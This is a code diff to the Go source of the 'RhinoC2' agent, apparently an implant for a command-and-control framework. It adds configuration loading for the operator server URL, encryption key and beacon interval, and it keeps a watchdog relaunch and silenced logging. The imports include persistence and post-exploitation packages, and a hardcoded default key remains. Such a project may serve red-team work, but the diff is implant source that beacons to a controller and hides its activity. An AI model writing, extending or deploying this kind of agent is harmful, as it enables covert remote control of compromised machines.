@@ -2,8 +2,10 @@ package main
 
 import (
 	"encoding/json"
+	"flag"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"log"
 	"os"
 	"os/exec"
@@ -13,6 +15,7 @@ import (
 	"rhinoc2/pkg/persistence"
 	"rhinoc2/pkg/postexploit"
 	"runtime"
+	"strconv"
 	"strings"
 	"time"
 
@@ -452,25 +455,102 @@ func (a *Agent) run() {
 	}
 }
 
+func loadConfig() Config {
+	var serverURL, key, configFile string
+	var interval int
+	var showHelp bool
+
+	flag.StringVar(&serverURL, "server", "", "Server URL (e.g., ws://192.168.1.100:8443/api/agent)")
+	flag.StringVar(&key, "key", "", "Encryption key")
+	flag.IntVar(&interval, "interval", 5, "Callback interval in seconds")
+	flag.StringVar(&configFile, "config", "", "Path to config file")
+	flag.BoolVar(&showHelp, "help", false, "Show help")
+
+	flag.Parse()
+
+	if showHelp {
+		fmt.Println("RhinoC2 Agent Configuration Options")
+		fmt.Println("Priority: 1) Command-line flags, 2) Environment variables, 3) Config file, 4) Defaults")
+		fmt.Println("\nCommand-line flags:")
+		flag.PrintDefaults()
+		fmt.Println("\nEnvironment variables:")
+		fmt.Println("  RHINO_SERVER    - Server URL")
+		fmt.Println("  RHINO_KEY       - Encryption key")
+		fmt.Println("  RHINO_INTERVAL  - Callback interval in seconds")
+		fmt.Println("\nConfig file format (JSON):")
+		fmt.Println(`  {
+    "server": "ws://192.168.1.100:8443/api/agent",
+    "key": "YourSecretKey",
+    "interval": 5
+  }`)
+		os.Exit(0)
+	}
+
+	config := Config{
+		ServerURL: "ws://localhost:8443/api/agent",
+		Key:       "RhinoC2SecretKey2024",
+		Interval:  5 * time.Second,
+	}
+
+	if configFile != "" {
+		data, err := ioutil.ReadFile(configFile)
+		if err == nil {
+			var fileConfig map[string]interface{}
+			if json.Unmarshal(data, &fileConfig) == nil {
+				if s, ok := fileConfig["server"].(string); ok {
+					config.ServerURL = s
+				}
+				if k, ok := fileConfig["key"].(string); ok {
+					config.Key = k
+				}
+				if i, ok := fileConfig["interval"].(float64); ok {
+					config.Interval = time.Duration(i) * time.Second
+				}
+			}
+		}
+	}
+
+	if envServer := os.Getenv("RHINO_SERVER"); envServer != "" {
+		config.ServerURL = envServer
+	}
+	if envKey := os.Getenv("RHINO_KEY"); envKey != "" {
+		config.Key = envKey
+	}
+	if envInterval := os.Getenv("RHINO_INTERVAL"); envInterval != "" {
+		if i, err := strconv.Atoi(envInterval); err == nil {
+			config.Interval = time.Duration(i) * time.Second
+		}
+	}
+
+	if serverURL != "" {
+		config.ServerURL = serverURL
+	}
+	if key != "" {
+		config.Key = key
+	}
+	if interval > 0 {
+		config.Interval = time.Duration(interval) * time.Second
+	}
+
+	return config
+}
+
 func main() {
-	// Check if running as watchdog or worker
-	isWatchdog := len(os.Args) > 1 && os.Args[1] == "--watchdog"
+	isWatchdog := false
+	for _, arg := range os.Args[1:] {
+		if arg == "--watchdog" {
+			isWatchdog = true
+			break
+		}
+	}
 
 	if !isWatchdog {
-		// First run - spawn watchdog and exit
 		runWatchdog()
 		return
 	}
 
-	// Running as actual agent
-	serverURL := "ws://localhost:8443/api/agent"
-	key := "RhinoC2SecretKey2024"
-
-	agent := newAgent(Config{
-		ServerURL: serverURL,
-		Key:       key,
-		Interval:  5 * time.Second,
-	})
+	config := loadConfig()
+	agent := newAgent(config)
 
 	log.SetOutput(io.Discard)
 	agent.run()
